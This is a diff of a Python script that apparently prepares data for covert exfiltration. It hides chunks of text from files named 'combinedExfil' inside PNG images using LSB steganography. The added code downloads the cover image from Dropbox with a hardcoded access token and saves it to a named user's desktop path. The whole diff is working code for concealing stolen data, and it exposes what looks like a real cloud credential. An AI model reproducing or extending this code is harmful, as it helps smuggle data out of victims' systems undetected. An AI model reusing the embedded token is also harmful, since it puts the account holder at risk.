@@ -290,11 +290,20 @@ def checkLine(filePath):
         last=line
     return last
 from stegano import lsb
+def downloadImage():
+    User = dropbox.client.DropboxClient("7SeVe0XoVRAAAAAAAAAAB8G1v4FBYZoqZJWlHboxeu1U4PWTigmgn9pKUZDMjT-J")
+    MDFolder = User.metadata('/')
+    print( 'MD: ', MDFolder)
+    f, MD = User.get_file_and_metadata("/diamond_PNG6695.png")
+    out = open('C:\\Users\Dhvanil\Desktop\diamond_PNG6695.png', 'wb')
+    out.write(f.read())
+    out.close()
 def stego():
     print("hi")
     global numBytes, numExfilFiles, numFiles, dT, eD,flg,textAdd,gpath
     numF=1
     flg=1
+    downloadImage()
     while numF<=numFiles:
         print("hey")
         textF=open((gpath+"\\"+str(numF)+"combinedExfil.txt"), "r")
@@ -308,7 +317,6 @@ def stego():
                 if line==last:
                     secret = lsb.hide(gpath+"\\diamond_PNG6695.png" , textAdd)
                     secret.save(gpath+"\\X"+str(numExfilFiles)+"combinedExfil.png")
-                    print(lsb.reveal("C:\\Users\Dhvanil\Desktop\\X"+str(numExfilFiles)+"combinedExfil.png"))
             elif numBytestextEx+sys.getsizeof(line)>=20000:
                 textAdd=line
                 secret = lsb.hide(gpath+"\\diamond_PNG6695.png", textAdd)
